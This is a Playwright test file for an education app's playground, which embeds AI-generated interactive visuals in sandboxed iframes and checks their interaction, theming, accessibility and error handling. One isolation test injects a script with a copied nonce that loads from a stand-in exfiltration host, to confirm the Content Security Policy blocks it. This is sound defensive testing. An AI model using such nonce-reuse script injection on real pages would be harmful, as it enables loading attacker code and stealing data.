import AxeBuilder from '@axe-core/playwright';
import { expect, test, type Page } from '@playwright/test';
import { execFileSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import path from 'node:path';

const python = path.resolve('.venv', process.platform === 'win32' ? 'Scripts/python.exe' : 'bin/python');
const fixture = JSON.parse(execFileSync(python, ['-c', "import sys,json;from socrat.explainer.artifact import compile_document; h,c=compile_document(sys.stdin.read(),'visual-fixture','http://localhost:3000'); print(json.dumps(dict(html=h,csp=c)))"], {
  input: readFileSync('services/api/tests/fixtures/visual.html'), env: { ...process.env, PYTHONPATH: path.resolve('services/api/src') }, encoding: 'utf8',
}));
const frameURL = 'http://127.0.0.1:8000/api/v1/playground/artifacts/visual-fixture/frame?token=fixture';
const artifact = (request: string) => ({ id: 'visual-fixture', title: 'Interactive multiplier', request, transcript: 'Multiplication combines equal groups. Change the multiplier to explore how the product changes.', level: 'standard', language: 'python', accuracy: 'AI-generated', created_at: 1, frame_url: frameURL, qa: { step_count: 4, checks: ['working-interaction'] } });

async function enrolled(page: Page) {
  const origin = 'http://localhost:3000';
  expect((await page.request.post('/api/v1/auth/dev-login', { headers: { Origin: origin }, data: { subject: `visual-${Date.now()}-${Math.random().toString(36).slice(2)}`, display_name: 'Learner' } })).ok()).toBe(true);
  const profile = await (await page.request.get('/api/v1/me')).json();
  const headers = { Origin: origin, 'X-CSRF-Token': profile.csrf_token };
  expect((await page.request.patch('/api/v1/me', { headers, data: { birth_year: 2000, timezone: 'Asia/Kolkata' } })).ok()).toBe(true);
  expect((await page.request.post('/api/v1/enrollments', { headers, data: { course: 'zero', language: 'python', level: 'brand-new', minutes_per_day: 30, weekdays: [0,1,2,3,4,5,6] } })).ok()).toBe(true);
}

async function mockVisual(page: Page) {
  await page.route('**/api/v1/playground/artifacts', route => route.fulfill({ json: { items: [], pending: null } }));
  await page.route(frameURL + '**', route => route.fulfill({ contentType: 'text/html', headers: { 'Content-Security-Policy': fixture.csp, 'Referrer-Policy': 'no-referrer' }, body: fixture.html }));
  // Generation is a server job: queued as running, then one poll finds it ready.
  let request = '';
  await page.route('**/api/v1/playground/generate', route => {
    request = route.request().postDataJSON().prompt;
    return route.fulfill({ status: 202, json: job(request, 'running') });
  });
  await page.route('**/api/v1/playground/jobs/visual-job', route => route.fulfill({ json: job(request, 'ready') }));
}

function job(request: string, status: string, error: string | null = null) {
  return { id: 'visual-job', status, error, request, level: 'standard', created_at: Math.floor(Date.now() / 1000), progress: { phase: 'checking', attempt: 1, characters: 9000 }, ...(status === 'ready' ? { artifact: artifact(request) } : {}) };
}

test('generated visual is embedded, interactive, editable, keyboard operable and isolated', async ({ page }, info) => {
  await enrolled(page); await mockVisual(page); await page.goto('/playground');
  const request = 'Explain how equal groups create a product. Let me edit the multiplier.';
  await page.getByLabel('Your question', { exact: true }).fill(request);
  const sent = page.waitForRequest(r => r.url().endsWith('/playground/generate'));
  await page.getByRole('button', { name: 'Generate', exact: true }).click();
  const payload = (await sent).postDataJSON();
  expect(Object.keys(payload).sort()).toEqual(['level','prompt','request_id']); expect(payload.prompt).toBe(request);
  await expect(page.getByRole('heading', { name: 'Interactive multiplier', exact: true })).toBeVisible();
  await expect(page.getByText('Step 1 of 4', { exact: true })).toBeVisible();
  const iframe = page.frameLocator('iframe[title="Interactive multiplier — interactive visual"]');
  await expect(iframe.getByLabel('Multiplier', { exact: true })).toBeVisible();
  await page.getByRole('button', { name: 'Next visual step', exact: true }).click();
  await expect(page.getByRole('status').filter({ hasText: '1 groups multiplied by 2 gives 2.' })).toBeVisible();
  await iframe.getByLabel('Multiplier', { exact: true }).fill('4');
  await expect(page.getByRole('status').filter({ hasText: '1 groups multiplied by 4 gives 4.' })).toBeVisible();
  const timeline = page.getByRole('slider', { name: 'Visual timeline' });
  await timeline.focus(); await timeline.press('End');
  await expect(page.getByRole('status').filter({ hasText: '3 groups multiplied by 4 gives 12.' })).toBeVisible();
  await expect(page.getByRole('button', { name: 'Next visual step', exact: true })).toBeDisabled();
  await page.getByRole('button', { name: 'Reset', exact: true }).click();
  await expect(iframe.getByLabel('Multiplier', { exact: true })).toHaveValue('2');
  const frame = page.frames().find(f => f.url().startsWith(frameURL))!;
  await frame.evaluate(() => {
    (window as unknown as { __explainer: { step: (index: number) => void } }).__explainer.step(2);
    document.getElementById('factor')!.dispatchEvent(new Event('input', { bubbles: true }));
  });
  await expect(page.getByText('Step 3 of 4', { exact: true })).toBeVisible();
  await expect(timeline).toHaveValue('2');
  await page.getByRole('button', { name: 'Reset', exact: true }).click();
  const isolation = await frame.evaluate(() => {
    const result = { cookies: false, parent: false };
    try { void document.cookie; result.cookies=true; } catch {}
    try { void window.parent.document.body; result.parent=true; } catch {}
    return result;
  });
  expect(isolation).toEqual({ cookies: false, parent: false });
  expect(await page.locator('iframe').getAttribute('sandbox')).toBe('allow-scripts');
  await page.mouse.move(0,0);
  expect((await new AxeBuilder({ page }).withTags(['wcag2a','wcag2aa','wcag21aa']).analyze()).violations).toEqual([]);
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true);
  await page.screenshot({ path: `.cache/visual-playground-${info.project.name}.png`, fullPage: true });
  const escaped: string[] = [];
  await page.route('http://socrat-exfil.invalid/**', route => { escaped.push(route.request().url()); return route.abort(); });
  const blocked = await frame.evaluate(() => new Promise<boolean>(resolve => {
    document.addEventListener('securitypolicyviolation', event => { if (event.blockedURI.startsWith('http://socrat-exfil.invalid')) resolve(true); }, { once: true });
    const script = document.createElement('script');
    script.nonce = document.querySelector<HTMLScriptElement>('script[nonce]')!.nonce;
    script.src = 'http://socrat-exfil.invalid/copied-nonce.js';
    document.body.appendChild(script);
    setTimeout(() => resolve(false), 2000);
  }));
  expect(blocked).toBe(true); expect(escaped).toEqual([]);
});

test('saved visual reopens after a preview error without another generation', async ({ page }) => {
  await enrolled(page); await mockVisual(page);
  const request = 'Explain multiplication visually with editable inputs';
  let generations = 0;
  page.on('request', request => { if (request.url().endsWith('/playground/generate')) generations++; });
  await page.route('**/api/v1/playground/artifacts/visual-fixture', route => route.fulfill({ json: artifact(request) }));
  await page.goto('/playground'); await page.getByLabel('Your question', { exact: true }).fill(request);
  await page.getByRole('button', { name: 'Generate', exact: true }).click();
  await expect(page.locator('iframe')).toHaveCSS('opacity', '1');
  const frame = page.frames().find(f => f.url().startsWith(frameURL))!;
  await frame.evaluate(() => window.dispatchEvent(new ErrorEvent('error', { message: 'Preview failed' })));
  await expect(page.getByRole('alert').filter({ hasText: 'The visual stopped responding' })).toBeVisible();
  await expect(page.locator('iframe')).toHaveCount(0);
  // Saved visuals: a panel tab on wide screens, an accordion on phones.
  await page.locator('[role="tab"]:visible, summary:visible').filter({ hasText: /^Saved \(/ }).first().click();
  await page.getByRole('button', { name: 'Open Interactive multiplier', exact: true }).click();
  await expect(page.locator('iframe')).toHaveCSS('opacity', '1');
  expect(generations).toBe(1);
});

test('visual receives the dashboard theme in light and dark modes', async ({ page }, info) => {
  test.setTimeout(90000);
  await enrolled(page); await mockVisual(page);
  for (const theme of ['light','dark'] as const) {
    await page.emulateMedia({ colorScheme: theme, reducedMotion: 'reduce' });
    await page.goto('/playground');
    await page.getByLabel('Your question', { exact: true }).fill('Explain multiplication visually');
    await page.getByRole('button', { name: 'Generate', exact: true }).click();
    await expect(page.getByText('Step 1 of 4', { exact: true })).toBeVisible();
    const primary = await page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue('--primary').trim());
    const frame = page.frames().find(f => f.url().startsWith(frameURL))!;
    await expect.poll(() => frame.evaluate(() => document.documentElement.style.getPropertyValue('--primary').trim())).toBe(primary);
    await expect(page.getByRole('button', { name: 'Play', exact: true })).toBeDisabled();
    await page.mouse.move(0,0);
    expect((await new AxeBuilder({ page }).withTags(['wcag2a','wcag2aa','wcag21aa']).analyze()).violations).toEqual([]);
    await page.screenshot({ path: `.cache/visual-theme-${theme}-${info.project.name}.png`, fullPage: true });
  }
});

test('course search stays scoped and generation sends the free request without preset data', async ({ page }) => {
  await enrolled(page); await mockVisual(page); await page.goto('/today');
  await expect(page.getByRole('link', { name: 'Start lesson' })).toBeVisible();
  await page.keyboard.press('Control+k');
  const dialog = page.getByRole('dialog');
  await expect(dialog.getByRole('option', { name: /Programs and output/ })).toBeVisible();
  await dialog.getByPlaceholder('Search lessons, problems, pages…').fill('Binary search');
  await expect(dialog.getByText('No results. Try another word.')).toBeVisible(); await page.keyboard.press('Escape');
  expect((await page.request.get('/api/v1/concepts/dsa:complexity')).status()).toBe(404);
  expect((await (await page.request.get('/api/v1/library?sort=popular')).json()).total).toBe(0);
  await page.getByRole('link', { name: /Ask about any concept|visually$/ }).first().click();
  const request = 'Explain the phases of the Moon with an interactive orbit';
  await page.getByLabel('Your question', { exact: true }).fill(request);
  const sent = page.waitForRequest(r => r.url().endsWith('/playground/generate'));
  await page.getByRole('button', { name: 'Generate', exact: true }).click();
  expect((await sent).postDataJSON().prompt).toBe(request);
  await expect(page.getByTestId('request-bar')).toContainText(request);
});

test('failed generation preserves the request and reporting removes a saved visual', async ({ page }) => {
  await enrolled(page); await mockVisual(page); await page.goto('/playground');
  const request = 'Explain multiplication with editable groups';
  await page.getByLabel('Your question', { exact: true }).fill(request);
  await page.route('**/api/v1/playground/generate', route => route.fulfill({ status: 202, json: job(request, 'failed', 'playground_generation_invalid') }));
  await page.getByRole('button', { name: 'Generate', exact: true }).click();
  await expect(page.getByRole('alert').filter({ hasText: 'Your request is still here' })).toBeVisible();
  await expect(page.getByLabel('Your question', { exact: true })).toHaveValue(request);
  await expect(page.locator('iframe')).toHaveCount(0);
  await page.unroute('**/api/v1/playground/generate'); await mockVisual(page);
  await page.getByRole('button', { name: 'Generate', exact: true }).click();
  await expect(page.getByText('Step 1 of 4', { exact: true })).toBeVisible();
  await page.route('**/api/v1/playground/artifacts/visual-fixture/report', route => route.fulfill({ json: { reported: true } }));
  await page.getByRole('button', { name: 'Report an issue' }).click();
  await page.getByLabel('What went wrong?').fill('The example does not explain the question.');
  await page.getByRole('button', { name: 'Send report' }).click();
  await expect(page.getByRole('status').filter({ hasText: 'Reported.' })).toBeVisible();
  await expect(page.locator('iframe')).toHaveCount(0);
});
